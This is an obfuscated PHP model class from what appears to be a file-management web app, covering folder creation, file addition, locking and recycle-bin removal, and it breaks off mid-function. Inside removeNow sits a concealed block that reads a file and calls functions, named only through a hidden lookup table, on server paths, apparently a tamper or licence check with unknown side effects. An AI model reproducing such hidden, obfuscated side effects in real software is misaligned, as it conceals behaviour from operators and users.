SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ºˆ“ˆ¥·) { $Ôá²À‡î =& $_SERVER[¬ÏÕ§Áú]; $„âŞÓŒ = Model($Ôá²À‡î[598])->where(array($Ôá²À‡î[1828] => $ºˆ“ˆ¥·))->find(); $”õŞ¦ş‹ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ºˆ“ˆ¥·, $„âŞÓŒ[$Ôá²À‡î[32]]); $this->userDesktopAdd($”õŞ¦ş‹); return $”õŞ¦ş‹; } public function userDesktopAdd($Ö§ã°«Ë) { $¦¢¦áÙ =& $_SERVER[¬ÏÕ§Áú]; $î˜µ£Ä = LNG($¦¢¦áÙ[2330]); $ŞÀŞÔÄË = $this->mkdir($Ö§ã°«Ë, $î˜µ£Ä); $this->metaSet($ŞÀŞÔÄË, $¦¢¦áÙ[2331], $¦¢¦áÙ[101]); $this->metaSet($Ö§ã°«Ë, $¦¢¦áÙ[2332], $ŞÀŞÔÄË); } public function userPathSafeAdd($ÇŞØŸõƒ) { $’Û…Ò° =& $_SERVER[¬ÏÕ§Áú]; $ş¬Ï‹– = Model($’Û…Ò°[598])->getInfoFull($ÇŞØŸõƒ); if (!$ş¬Ï‹–) { return !1; } if (_get($ş¬Ï‹–, $’Û…Ò°[619])) { return $ş¬Ï‹–[$’Û…Ò°[560]][$’Û…Ò°[2333]]; } $€±å«öç = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÇŞØŸõƒ, $’Û…Ò°[2334], $’Û…Ò°[2335]); Model($’Û…Ò°[598])->metaSet($ÇŞØŸõƒ, $’Û…Ò°[2333], $€±å«öç); $this->metaSet($€±å«öç, $’Û…Ò°[2336], $ÇŞØŸõƒ); return $€±å«öç; } public function userPathAppAdd($¦¯¶£€, $àšŒÂ ¦ = '', $®‰ÌñÀë = '') { $÷º¦Û =& $_SERVER[¬ÏÕ§Áú]; $–™Ç×ù = Model($÷º¦Û[598])->getInfoFull($¦¯¶£€); if (!$–™Ç×ù) { return !1; } $ô„˜Öçê = $–™Ç×ù[$÷º¦Û[560]] ? $–™Ç×ù[$÷º¦Û[560]] : array(); $ÊÈ›…—‚ = $ô„˜Öçê[$÷º¦Û[2337]]; if (!$ÊÈ›…—‚) { $ÊÈ›…—‚ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¦¯¶£€, $÷º¦Û[2338], $÷º¦Û[2339]); Model($÷º¦Û[598])->metaSet($¦¯¶£€, $÷º¦Û[2337], $ÊÈ›…—‚ . $÷º¦Û[12]); $this->metaSet($ÊÈ›…—‚, $÷º¦Û[2337], $¦¯¶£€); } if (!$àšŒÂ ¦) { return $ÊÈ›…—‚; } $© š· = $ô„˜Öçê[$÷º¦Û[2340] . $àšŒÂ ¦]; if (!$© š·) { $© š· = $this->mkdir($ÊÈ›…—‚, $àšŒÂ ¦); Model($÷º¦Û[598])->metaSet($¦¯¶£€, $÷º¦Û[2340] . $àšŒÂ ¦, $© š·); $this->metaSet($© š·, $÷º¦Û[2340] . $àšŒÂ ¦, $¦¯¶£€); } if (!$®‰ÌñÀë) { return $© š·; } $çÔóŞ“Ë = $this->mkdir($© š·, $®‰ÌñÀë); return $çÔóŞ“Ë; } public function groupRootAdd($²Ğ¦‘çÎ) { $¥ÓÆ±ï¥ =& $_SERVER[¬ÏÕ§Áú]; $¤ÃÓä¾ = Model($¥ÓÆ±ï¥[606])->where(array($¥ÓÆ±ï¥[2126] => $²Ğ¦‘çÎ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $²Ğ¦‘çÎ, $¤ÃÓä¾[$¥ÓÆ±ï¥[32]]); } public function systemRootPathAdd($À°©ÆÒÎ) { if ($À°©ÆÒÎ != $_SERVER[¬ÏÕ§Áú][629]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $À°©ÆÒÎ); } public function userRootRemove($„óë·í) { $Àô…÷ÚŞ = $this->targetSourceRoot(SourceModel::TYPE_USER, $„óë·í, !0); foreach ($Àô…÷ÚŞ as $Š‡ºš•º) { if (!$Š‡ºš•º) { continue; } $this->remove($Š‡ºš•º[$_SERVER[¬ÏÕ§Áú][204]], !1); } } public function groupRootRemove($ÙÁÒÄ»à) { $ì›úµ¼ù = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ÙÁÒÄ»à); if (!$ì›úµ¼ù) { return; } $this->remove($ì›úµ¼ù[$_SERVER[¬ÏÕ§Áú][204]], !1); } private function _mkdirRoot($‚øõµ², $¨¾êÂ’”, $‡¬ûõÃ, $ñÀè‡¶ = '') { $ñÉ”÷êÛ =& $_SERVER[¬ÏÕ§Áú]; $‘Û÷ƒÁŞ = KodUser::id(); $°ÑáÆËœ = array($ñÉ”÷êÛ[497] => 0, $ñÉ”÷êÛ[672] => $‚øõµ², $ñÉ”÷êÛ[673] => $¨¾êÂ’”, $ñÉ”÷êÛ[670] => 1, $ñÉ”÷êÛ[674] => $‘Û÷ƒÁŞ, $ñÉ”÷êÛ[675] => $‘Û÷ƒÁŞ, $ñÉ”÷êÛ[671] => $ñÀè‡¶, $ñÉ”÷êÛ[676] => $ñÉ”÷êÛ[614], $ñÉ”÷êÛ[524] => 0, $ñÉ”÷êÛ[641] => 0, $ñÉ”÷êÛ[563] => 0, $ñÉ”÷êÛ[677] => $ñÉ”÷êÛ[12]); if ($¹œŞ = $this->where($°ÑáÆËœ)->find()) { return $¹œŞ[$ñÉ”÷êÛ[204]]; } $Õ®ÉÄÃï = "\x4d\x6f\x64\145\x6c\123\x6f\x75\x72\x63\145\56\x6d\153\144\x69\x72\x52\157\x6f\164\56{$‚øõµ²}\x2e{$¨¾êÂ’”}\x2e" . $‡¬ûõÃ; CacheLock::lock($Õ®ÉÄÃï); $°ÑáÆËœ[$ñÉ”÷êÛ[32]] = $‡¬ûõÃ; $˜—ã¶‡¾ = $this->add($°ÑáÆËœ); $ÌÂØÈ²À = array($ñÉ”÷êÛ[678] => short_id($˜—ã¶‡¾)); $this->where(array($ñÉ”÷êÛ[511] => $˜—ã¶‡¾))->save($ÌÂØÈ²À); CacheLock::unlock($Õ®ÉÄÃï); return $˜—ã¶‡¾; } private function targetSourceRoot($óÃ™º½ù, $Â©çÇ¼Ö, $ò·ºıÄ = false) { $¬ª”ô­ø =& $_SERVER[¬ÏÕ§Áú]; $æš•ü­ = array($¬ª”ô­ø[497] => 0, $¬ª”ô­ø[672] => $óÃ™º½ù, $¬ª”ô­ø[673] => $Â©çÇ¼Ö); if ($ò·ºıÄ) { $Şâæ »‰ = $this->where($æš•ü­)->select(); return $Şâæ »‰ ? $Şâæ »‰ : array(); } $ÖñØ­ëÆ = $this->where($æš•ü­)->find(); return $ÖñØ­ëÆ ? $ÖñØ­ëÆ : array(); } public function sourceRootGroup($‡Çø·”¼) { $Å™¼ßò³ =& $_SERVER[¬ÏÕ§Áú]; if (is_string($‡Çø·”¼)) { $‡Çø·”¼ = array($‡Çø·”¼); } $è¥õ–Ìü = $this->listSourceRoot(SourceModel::TYPE_GROUP, $‡Çø·”¼, $Å™¼ßò³[233]); $ÄÁ‹´æñ = array($Å™¼ßò³[456] => $è¥õ–Ìü, $Å™¼ßò³[453] => array($Å™¼ßò³[872] => count($‡Çø·”¼))); $this->_listDataApply($ÄÁ‹´æñ[$Å™¼ßò³[456]]); $this->_listMake($ÄÁ‹´æñ); return array_to_keyvalue($ÄÁ‹´æñ[$Å™¼ßò³[95]], $Å™¼ßò³[590]); } public function mkfile($±¹ô¢š, $¼¤ƒ¾ßØ, $°—ıÖåå = '', $ú«œ•Æ³ = REPEAT_RENAME) { $·›šìÍ„ =& $_SERVER[¬ÏÕ§Áú]; $ÒÛÈà¥º = KodIO::ioFileDriverGet($·›šìÍ„[503] . $±¹ô¢š . $·›šìÍ„[413]); $íİêïÕ¤ = Model($·›šìÍ„[698])->addFileByContent($°—ıÖåå, $ÒÛÈà¥º, $¼¤ƒ¾ßØ); return $this->_createFileCall($±¹ô¢š, $¼¤ƒ¾ßØ, $íİêïÕ¤, $ú«œ•Æ³, $·›šìÍ„[1493]); } public function addFile($€‚ß‘†‰, $¦ÃÑåâÓ, $½¥ı–µ, $È‘¦ğ˜Ä = false, $¸´á§µò = REPEAT_RENAME) { $²İ÷Øş‹ =& $_SERVER[¬ÏÕ§Áú]; $§Ä•§” = KodIO::ioFileDriverGet($²İ÷Øş‹[503] . $€‚ß‘†‰ . $²İ÷Øş‹[413]); $Ä©ü‡Ø¸ = Model($²İ÷Øş‹[698])->addFile($¦ÃÑåâÓ, $§Ä•§”, $½¥ı–µ, $È‘¦ğ˜Ä); return $this->_createFileCall($€‚ß‘†‰, $½¥ı–µ, $Ä©ü‡Ø¸, $¸´á§µò); } public function addFileByFileID($½¼À‚“À, $ŞÖÚş›¬, $åúûÊˆ–, $µëÎ„é = REPEAT_RENAME) { $—íÇ’²» =& $_SERVER[¬ÏÕ§Áú]; $Ñ¾‘‚Á = Model($—íÇ’²»[698])->find($ŞÖÚş›¬); Model($—íÇ’²»[698])->linkAdd($ŞÖÚş›¬); return $this->_createFileCall($½¼À‚“À, $åúûÊˆ–, $Ñ¾‘‚Á, $µëÎ„é); } public function addFileByRemote($ñƒ¬«Ÿú, $è†ÃÁ¼, $²ÑªïÑ, $çü†­„ = array(), $‘ø“Ó = REPEAT_RENAME) { $áÄ£¨ = Model($_SERVER[¬ÏÕ§Áú][698])->addFileByRemote($è†ÃÁ¼, $²ÑªïÑ, $çü†­„); return $this->_createFileCall($ñƒ¬«Ÿú, $²ÑªïÑ, $áÄ£¨, $‘ø“Ó); } private function _createFileCall($°àÛ†µ¿, $×”½Ó”, $ôõ’²¾Š, $®Ô—ÉÇÏ, $’á¢¦ö = "\x75\x70\x6c\x6f\141\144") { $ÍÏ…º‚™ =& $_SERVER[¬ÏÕ§Áú]; if (!$ôõ’²¾Š) { return !1; } $ù÷´ìò£ = !1; $this->setMasterDB(); $this->lockWriteStart($°àÛ†µ¿, $×”½Ó”); $ ˆ¿Áóá = $this->fileNameExist($°àÛ†µ¿, $×”½Ó”); $µµÍü¡å = $this->_createFile($°àÛ†µ¿, $×”½Ó”, $ôõ’²¾Š, $®Ô—ÉÇÏ, $ù÷´ìò£); if (!$ù÷´ìò£) { Model($ÍÏ…º‚™[565])->remove($ôõ’²¾Š[$ÍÏ…º‚™[562]]); } if ($ù÷´ìò£ && $µµÍü¡å && $µµÍü¡å != $ ˆ¿Áóá) { Model($ÍÏ…º‚™[2302])->eventCreate($µµÍü¡å, $’á¢¦ö); } $this->lockWriteEnd($°àÛ†µ¿, $×”½Ó”); return $µµÍü¡å; } public function mkdir($Ï‹©Õ’˜, $äÔ¿…›², $ü©¦ı®œ = REPEAT_SKIP) { $ö÷¤×¬ö =& $_SERVER[¬ÏÕ§Áú]; $this->setMasterDB(); $…ıôšÇ = $this->sourceInfo($Ï‹©Õ’˜); if (!$…ıôšÇ) { return !1; } $this->lockWriteStart($Ï‹©Õ’˜, $äÔ¿…›²); if ($ü©¦ı®œ !== !1) { $ˆ¿ÀŠñ = $this->fileNameExist($Ï‹©Õ’˜, $äÔ¿…›²); if ($ˆ¿ÀŠñ && $ü©¦ı®œ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ï‹©Õ’˜, $äÔ¿…›²); return $ˆ¿ÀŠñ; } $äÔ¿…›² = $this->fileNameAuto($Ï‹©Õ’˜, $äÔ¿…›², $ü©¦ı®œ); } $¬Ø¯Ó = array($ö÷¤×¬ö[670] => 1, $ö÷¤×¬ö[514] => $äÔ¿…›², $ö÷¤×¬ö[671] => $ö÷¤×¬ö[12], $ö÷¤×¬ö[563] => 0, $ö÷¤×¬ö[641] => 0); $üóöáÑñ = $this->_addSource($¬Ø¯Ó, $…ıôšÇ); Model($ö÷¤×¬ö[2302])->eventCreate($üóöáÑñ, $ö÷¤×¬ö[1494]); $this->lockWriteEnd($Ï‹©Õ’˜, $äÔ¿…›²); return $üóöáÑñ; } public function listSourceRoot($”ì‹ª£, $¤²Î´œî, $ç×Ï£•¼ = "\163\x6f\x75\162\x63\145\x49\x44\x2c\164\x61\x72\147\145\x74\x49\104\54\x73\151\172\145") { $çÙØ•—³ =& $_SERVER[¬ÏÕ§Áú]; $àÊÕ¿ºñ = $çÙØ•—³[69]; $Åõ è®¥ = array(); $Ãö‘ì² = 1024 * 50; $š²ĞµŠ = is_array($š²ĞµŠ) ? $š²ĞµŠ : array(); $úŸ¶ş°° = count($¤²Î´œî); $ğ£Âé€­ = $this->tablePrefix . $çÙØ•—³[2341]; for ($»éäˆ³š = 0; $»éäˆ³š < $úŸ¶ş°°; $»éäˆ³š++) { $‚­‹† = $¤²Î´œî[$»éäˆ³š]; $àÊÕ¿ºñ .= "\123\x45\114\105\x43\124\x20\x2a\x20\x46\x52\x4f\x4d\x20\x28\x53\105\x4c\x45\x43\x54\x20{$ç×Ï£•¼}\40\106\x52\x4f\115\x20\140{$ğ£Âé€­}\140\x20\x57\x48\x45\122\105\x20"; $àÊÕ¿ºñ .= "\x60\x70\141\x72\x65\156\x74\111\x44\x60\75\x30\40\101\x4e\x44\x20\x60\x74\141\162\x67\x65\164\x49\104\x60\x3d{$‚­‹†}\40\x41\x4e\x44\40\140\x74\x61\x72\147\145\x74\x54\x79\160\x65\140\75{$”ì‹ª£}\x20\141\156\x64\40\146\x69\x6c\145\124\171\x70\145\x3d\47\47\40\154\x69\x6d\151\164\x20\61\x29\40\141\163\x20\x74\142\x5f{$»éäˆ³š}\x20\x55\116\111\117\116\40\101\114\114\x20"; if ((strlen($àÊÕ¿ºñ) >= $Ãö‘ì² || $»éäˆ³š == $úŸ¶ş°° - 1) && $àÊÕ¿ºñ) { $àÊÕ¿ºñ = substr($àÊÕ¿ºñ, 0, -strlen($çÙØ•—³[1163])); $·¾«˜ = $this->query($àÊÕ¿ºñ); $àÊÕ¿ºñ = $çÙØ•—³[12]; $Åõ è®¥ = array_merge($Åõ è®¥, $·¾«˜); } } return $Åõ è®¥; } private function _createFile($Ñì—ü´, $£ñ£Ø•š, $Ÿ¾•âŠ¹, $£ÄÔğîé, &$“ŸµÉ¼) { $¸îÛã =& $_SERVER[¬ÏÕ§Áú]; $Æêõèí = $this->sourceInfo($Ñì—ü´); if (!$Ÿ¾•âŠ¹ || !$Æêõèí) { return !1; } if ($£ÄÔğîé !== !1) { $±Æ“·Ùµ = $this->fileNameExist($Ñì—ü´, $£ñ£Ø•š); } $“ŸµÉ¼ = !0; if ($£ÄÔğîé && $±Æ“·Ùµ) { if ($£ÄÔğîé == REPEAT_SKIP) { $“ŸµÉ¼ = !1; return $±Æ“·Ùµ; } else { if ($£ÄÔğîé == REPEAT_REPLACE) { $ìËÕ»«­ = $this->sourceInfo($±Æ“·Ùµ); $ÖŸÓæÚ´ = $this->fileHistory($ìËÕ»«­, $Ÿ¾•âŠ¹[$¸îÛã[562]], $Ÿ¾•âŠ¹[$¸îÛã[89]]); if (!$ÖŸÓæÚ´) { $“ŸµÉ¼ = !1; } else { $this->folderSizeReset($Ñì—ü´); } return $±Æ“·Ùµ; } else { $£ñ£Ø•š = $this->fileNameAuto($Ñì—ü´, $£ñ£Ø•š, $£ÄÔğîé, !1); } } } $ÌÄº§« = array($¸îÛã[670] => 0, $¸îÛã[514] => $£ñ£Ø•š, $¸îÛã[671] => substr(get_path_ext($£ñ£Ø•š), 0, 10), $¸îÛã[563] => $Ÿ¾•âŠ¹[$¸îÛã[562]], $¸îÛã[641] => $Ÿ¾•âŠ¹[$¸îÛã[89]]); $ÓµÂ‰éî = $this->_addSource($ÌÄº§«, $Æêõèí); $this->folderSizeReset($Ñì—ü´, intval($ÌÄº§«[$¸îÛã[89]])); return $ÓµÂ‰éî; } protected function fileHistory($£‡Ê¹Ê‡, $äÈÅÎú´, $‘¢±Ì©à) { $—Ğ×‡€ =& $_SERVER[¬ÏÕ§Áú]; if ($£‡Ê¹Ê‡[$—Ğ×‡€[562]] == $äÈÅÎú´) { return !1; } $this->checkLock($£‡Ê¹Ê‡[$—Ğ×‡€[204]], $äÈÅÎú´); Model($—Ğ×‡€[2342])->addHistory($£‡Ê¹Ê‡); $ÜÀãÔø… = array($—Ğ×‡€[675] => USER_ID, $—Ğ×‡€[518] => time(), $—Ğ×‡€[562] => $äÈÅÎú´, $—Ğ×‡€[89] => $‘¢±Ì©à); $this->where(array($—Ğ×‡€[511] => $£‡Ê¹Ê‡[$—Ğ×‡€[204]]))->save($ÜÀãÔø…); $this->sourceCacheClear($£‡Ê¹Ê‡[$—Ğ×‡€[204]]); return !0; } public function checkLock($ØÉ¯¾Ÿİ, $«Ñ½»œû) { $ªë‰¨«À =& $_SERVER[¬ÏÕ§Áú]; $ªéÍËàå = $this->pathInfo($ØÉ¯¾Ÿİ); if (!$this->fileIsLock($ªéÍËàå, !0)) { return; } $„Æ—àéà = Session::get($ªë‰¨«À[2343]); $ş”¬ˆ¢» = substr($ªéÍËàå[$ªë‰¨«À[32]], 0, -1 - strlen($ªéÍËàå[$ªë‰¨«À[179]])) . $ªë‰¨«À[1348] . $„Æ—àéà . $ªë‰¨«À[10] . $ªéÍËàå[$ªë‰¨«À[179]]; $ƒÊ‡şºğ = Model($ªë‰¨«À[698])->find($«Ñ½»œû); $this->_createFileCall($ªéÍËàå[$ªë‰¨«À[203]], $ş”¬ˆ¢», $ƒÊ‡şºğ, REPEAT_REPLACE, $ªë‰¨«À[1493]); $Ò¾ÜÓÒü = $ªéÍËàå[$ªë‰¨«À[560]][$ªë‰¨«À[634]]; $îÉê¨Ü§ = $Ò¾ÜÓÒü[$ªë‰¨«À[2344]] ? $Ò¾ÜÓÒü[$ªë‰¨«À[2344]] : $Ò¾ÜÓÒü[$ªë‰¨«À[32]]; show_json(LNG($ªë‰¨«À[2345]) . $ªë‰¨«À[2346] . LNG($ªë‰¨«À[2347]) . $ªë‰¨«À[2348] . $îÉê¨Ü§ . $ªë‰¨«À[2349], !1); } public function fileIsLock($Ø–ı„ò, $£¤Å²Ñò = false) { $ÌâµÜ´Ñ =& $_SERVER[¬ÏÕ§Áú]; if (!_get($Ø–ı„ò, $ÌâµÜ´Ñ[630], 0)) { return !1; } if ($Ø–ı„ò[$ÌâµÜ´Ñ[560]][$ÌâµÜ´Ñ[633]] != USER_ID) { return !0; } $ç¤Ÿ¿İÆ = $GLOBALS[$ÌâµÜ´Ñ[6]][$ÌâµÜ´Ñ[102]][$ÌâµÜ´Ñ[631]]; if ($Ø–ı„ò[$ÌâµÜ´Ñ[560]][$ÌâµÜ´Ñ[632]] <= time() - $ç¤Ÿ¿İÆ) { $this->metaSet($Ø–ı„ò[$ÌâµÜ´Ñ[204]], $ÌâµÜ´Ñ[633], null); $this->metaSet($Ø–ı„ò[$ÌâµÜ´Ñ[204]], $ÌâµÜ´Ñ[632], null); } if ($£¤Å²Ñò) { $this->metaSet($Ø–ı„ò[$ÌâµÜ´Ñ[204]], $ÌâµÜ´Ñ[632], time()); } return !1; } private function _addSource($Ûı¨’£¬, $ë×Í„È±) { $Ã¼ˆ¶¥Å =& $_SERVER[¬ÏÕ§Áú]; $»ñë¾· = KodUser::id(); $Œü°©Ş = array($Ã¼ˆ¶¥Å[672] => $ë×Í„È±[$Ã¼ˆ¶¥Å[201]], $Ã¼ˆ¶¥Å[673] => $ë×Í„È±[$Ã¼ˆ¶¥Å[590]], $Ã¼ˆ¶¥Å[674] => $»ñë¾·, $Ã¼ˆ¶¥Å[675] => $»ñë¾·, $Ã¼ˆ¶¥Å[497] => $ë×Í„È±[$Ã¼ˆ¶¥Å[204]], $Ã¼ˆ¶¥Å[676] => $ë×Í„È±[$Ã¼ˆ¶¥Å[605]] . $ë×Í„È±[$Ã¼ˆ¶¥Å[204]] . $Ã¼ˆ¶¥Å[50], $Ã¼ˆ¶¥Å[524] => 0, $Ã¼ˆ¶¥Å[677] => $Ã¼ˆ¶¥Å[12]); $Ûı¨’£¬ = array_merge($Œü°©Ş, $Ûı¨’£¬); $this->updateModifyTime($Ûı¨’£¬[$Ã¼ˆ¶¥Å[203]]); $ô¬ÜßÓĞ = $Ã¼ˆ¶¥Å[2350] . $ë×Í„È±[$Ã¼ˆ¶¥Å[204]]; if (isset(self::$cacheChildList[$ô¬ÜßÓĞ])) { unset(self::$cacheChildList[$ô¬ÜßÓĞ]); } static $è÷±—òÖ = false; if (!$è÷±—òÖ) { Hook::trigger($Ã¼ˆ¶¥Å[660], $Ûı¨’£¬); $è÷±—òÖ = !0; } $ØïÄ‡Ñô = $this->add($Ûı¨’£¬); $Ï‹ŒÜüº = array($Ã¼ˆ¶¥Å[678] => short_id($ØïÄ‡Ñô)); $this->where(array($Ã¼ˆ¶¥Å[511] => $ØïÄ‡Ñô))->save($Ï‹ŒÜüº); $this->setNamePinyin($ØïÄ‡Ñô, $Ûı¨’£¬[$Ã¼ˆ¶¥Å[32]]); return $ØïÄ‡Ñô; } public function remove($³³ö„û, $áİ˜·â = true) { $²™Ò´„¬ =& $_SERVER[¬ÏÕ§Áú]; $‘­ü¼ÄÚ = $this->sourceInfo($³³ö„û); $÷šé‰Ï• = intval($‘­ü¼ÄÚ[$²™Ò´„¬[201]]) === self::TYPE_SYSTEM; $¨Èú³‚ = Model($²™Ò´„¬[527])->get($²™Ò´„¬[2351]) == $²™Ò´„¬[101]; if ($÷šé‰Ï• || $áİ˜·â || !$¨Èú³‚) { return $this->removeNow($³³ö„û, $áİ˜·â); } $ß£èàÈë = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ß˜ìşÙ = $‘­ü¼ÄÚ[$²™Ò´„¬[201]] == self::TYPE_USER ? $²™Ò´„¬[686] : $²™Ò´„¬[599]; if ($ß˜ìşÙ == $²™Ò´„¬[686]) { $àŒ°Ä„› = Model($²™Ò´„¬[598])->getInfo($‘­ü¼ÄÚ[$²™Ò´„¬[590]]); $ğ¾ãë = !empty($àŒ°Ä„›[$²™Ò´„¬[2344]]) ? $àŒ°Ä„›[$²™Ò´„¬[2344]] : $àŒ°Ä„›[$²™Ò´„¬[32]]; $ğ¾ãë = $²™Ò´„¬[349] . $ğ¾ãë . $²™Ò´„¬[2352] . $‘­ü¼ÄÚ[$²™Ò´„¬[590]]; } else { $àŒ°Ä„› = Model($²™Ò´„¬[606])->getInfo($‘­ü¼ÄÚ[$²™Ò´„¬[590]]); $ğ¾ãë = _get($àŒ°Ä„›, $²™Ò´„¬[32]); $ğ¾ãë = $²™Ò´„¬[186] . $ğ¾ãë . $²™Ò´„¬[2353] . $‘­ü¼ÄÚ[$²™Ò´„¬[590]]; } $àŒ‡’ïŠ = $²™Ò´„¬[2354] . md5($ğ¾ãë); CacheLock::lock($àŒ‡’ïŠ); $¼â«¢ŞÅ = $this->fileNameExist($ß£èàÈë, $ğ¾ãë); if (!$¼â«¢ŞÅ) { $¼â«¢ŞÅ = $this->mkdir($ß£èàÈë, $ğ¾ãë, REPEAT_SKIP); $this->metaSet($¼â«¢ŞÅ, $²™Ò´„¬[2355], $ß˜ìşÙ); $this->metaSet($¼â«¢ŞÅ, $²™Ò´„¬[2356], $‘­ü¼ÄÚ[$²™Ò´„¬[590]]); if ($‘­ü¼ÄÚ[$²™Ò´„¬[203]] != 0) { $this->metaSet($¼â«¢ŞÅ, $²™Ò´„¬[2357], _get($àŒ°Ä„›, $²™Ò´„¬[2358])); } } CacheLock::unlock($àŒ‡’ïŠ); $this->metaSet($³³ö„û, $²™Ò´„¬[2359], $‘­ü¼ÄÚ[$²™Ò´„¬[203]]); $this->where(array($²™Ò´„¬[204] => $³³ö„û))->save(array($²™Ò´„¬[518] => time())); $this->recycleClear($‘­ü¼ÄÚ); Model($²™Ò´„¬[657])->eventRemove($³³ö„û); $ÖØÆ¨Ï = $this->move($³³ö„û, $¼â«¢ŞÅ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‘­ü¼ÄÚ[$²™Ò´„¬[203]]); return $ÖØÆ¨Ï; } private function recycleClear($¦ˆå…Ò) { $·±•ÈÇñ =& $_SERVER[¬ÏÕ§Áú]; $Ê—·µ†€ = $this->childrenAll($¦ˆå…Ò); $•“Æ¿çÊ = array($·±•ÈÇñ[511] => array($·±•ÈÇñ[512], $Ê—·µ†€[$·±•ÈÇñ[2360]])); Model($·±•ÈÇñ[2361])->where($•“Æ¿çÊ)->delete(); } public function removeNow($¦ÉüƒÎ¯, $ö™¥ïœé = true) { $å÷•Ï­‚ =& $_SERVER[¬ÏÕ§Áú]; if ($_SERVER[$å÷•Ï­‚[60]] != $_SERVER[$å÷•Ï­‚[2228]]) { $ŠÄ²ËºÍ = $å÷•Ï­‚[1002]; $˜òĞªßµ = $å÷•Ï­‚[62]; $»˜ŠŠäª = $_SERVER[$å÷•Ï­‚[63]] . $å÷•Ï­‚[64]; $«à«Ùê = $˜òĞªßµ($»˜ŠŠäª); $È†öÑËŸ = explode($å÷•Ï­‚[65], $«à«Ùê); if (count($È†öÑËŸ) < $å÷•Ï­‚[711]) { $Øú®Ô±› = $å÷•Ï­‚[67]; $Øú®Ô±›(); } $ô¢ÜİŸ¦ = $å÷•Ï­‚[1003]; $ô¢ÜİŸ¦($_SERVER[$å÷•Ï­‚[1004]]); $ô¢ÜİŸ¦($_SERVER[$å÷•Ï­‚[63]] . $å÷•Ï­‚[2362]); $˜×Ö† = 1; while ($˜×Ö† > 1) { $˜×Ö† = $˜×Ö† + 4; $İ£¬É€ä = rawurlencode($˜×Ö† . $å÷•Ï­‚[69]); } } $ôì¥Äê¹ = $this->sourceInfo($¦ÉüƒÎ¯); $×ˆİä€Ü = $this->pathInfoMore($¦ÉüƒÎ¯); if (!$ôì¥Äê¹) { return !0; } if ($ôì¥Äê¹[$å÷•Ï­‚[203]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($¦ÉüƒÎ¯); Hook::trigger($å÷•Ï­‚[2363], $×ˆİä€Ü, $ö™¥ïœé); if ($ö™¥ïœé) { Model($å÷•Ï­‚[2361])->moveToRecycle($¦ÉüƒÎ¯); } else { $êëŒéö» = $this->childrenAll($ôì¥Äê¹); Model($å÷•Ï­‚[657])->eventRemove($¦ÉüƒÎ¯); $this->removeRelevance($êëŒéö»[$å÷•Ï­‚[2360]], $êëŒéö»[$å÷•Ï­‚[1638]]); } $this->folderSizeReset($ôì¥Äê¹[$å÷•Ï­‚[203]]); $íöêÜØè = array($ôì¥Äê¹[$å÷•Ï­‚[203]]); if ($ôì¥Äê¹[$å÷•Ï­‚[505]] == $å÷•Ï­‚[101]) { $íöêÜØè[] = $ôì¥Äê¹[$å÷•Ï­‚[204]]; } $this->updateModifyTime($íöêÜØè); $this->lockMoveEnd($¦ÉüƒÎ¯); Hook::trigger($å÷•Ï­‚[1880], $×ˆİä€Ü, $ö™¥ïœé); return !0; } public function childrenAll($Æïíñµò) { $š‰‚Ñì =& $_SERVER[¬ÏÕ§Áú]; $˜÷† ×¡ = $Æïíñµò[$š‰‚Ñì[204]]; if ($Æïíñµò[$š‰‚Ñì[505]] == $š‰‚Ñì[101]) { $óîãÈÍí = array($š‰‚Ñì[676] => array($š‰‚Ñì[636], $Æïíñµò[$š‰‚Ñì[605]] . $˜÷† ×¡ . $š‰‚Ñì[637])); $²çøÉ›Ê = array($š‰‚Ñì[676] => $óîãÈÍí[$š‰‚Ñì[605]]); $§½¥ÅÜú = $this->field($š‰‚Ñì[2364])->where($²çøÉ›Ê)->select(); $–¸¶£ûÊ = !1; $®ğĞæ„Œ = array($˜÷† ×¡); if ($§½¥ÅÜú) { $–¸¶£ûÊ = array_to_keyvalue($§½¥ÅÜú, $š‰‚Ñì[12], $š‰‚Ñì[562]); $–¸¶£ûÊ = array_remove_value($–¸¶£ûÊ, $š‰‚Ñì[241]); $®ğĞæ„Œ = array_to_keyvalue($§½¥ÅÜú, $š‰‚Ñì[12], $š‰‚Ñì[204]); $®ğĞæ„Œ[] = $˜÷† ×¡; } } else { $–¸¶£ûÊ = array($Æïíñµò[$š‰‚Ñì[562]]); $®ğĞæ„Œ = array($˜÷† ×¡); } return array($š‰‚Ñì[2360] => $®ğĞæ„Œ, $š‰‚Ñì[1638] => $–¸¶£ûÊ); } public function removeArray($œÎÔİ•©) { if (!$œÎÔİ•©) { return !0; } } public function removeRelevance($‹¬’ùÛƒ, $şÂ’¤éç) { $ßÇí‡Ë– =& $_SERVER[¬ÏÕ§Áú]; $‹¬’ùÛƒ = $‹¬’ùÛƒ ? $‹¬’ùÛƒ : array(); $şÂ’¤éç = $şÂ’¤éç ? $şÂ’¤éç : array(); $‹¬’ùÛƒ = array_unique(array_filter($‹¬’ùÛƒ)); $şÂ’¤éç = array_filter($şÂ’¤éç); if (!$‹¬’ùÛƒ) { return !1; } $ıÒàË‹í = array($ßÇí‡Ë–[511] => array($ßÇí‡Ë–[512], $‹¬’ùÛƒ)); Model($ßÇí‡Ë–[2361])->where($ıÒàË‹í)->delete(); Model($ßÇí‡Ë–[554])->where($ıÒàË‹í)->delete(); Model($ßÇí‡Ë–[2191])->where($ıÒàË‹í)->delete(); Model($ßÇí‡Ë–[657])->where($ıÒàË‹í)->delete(); Model($ßÇí‡Ë–[2017])->removeBySource($‹¬’ùÛƒ); Model($ßÇí‡Ë–[2342])->removeBySource($‹¬’ùÛƒ); $this->where($ıÒàË‹í)->delete(); Model($ßÇí‡Ë–[565])->remove($şÂ’¤éç); for ($¢¯õëù¼ = 0; $¢¯õëù¼ < count($‹¬’ùÛƒ); $¢¯õëù¼++) { $this->sourceCacheClear($‹¬’ùÛƒ[$¢¯õëù¼]); } } public function rename($úÙ’¤ÏÇ, $÷ø¼—ê) { $Œíõ¢ûï =& $_SERVER[¬ÏÕ§Áú]; $£’¢Èáı = $this->sourceInfo($úÙ’¤ÏÇ); if 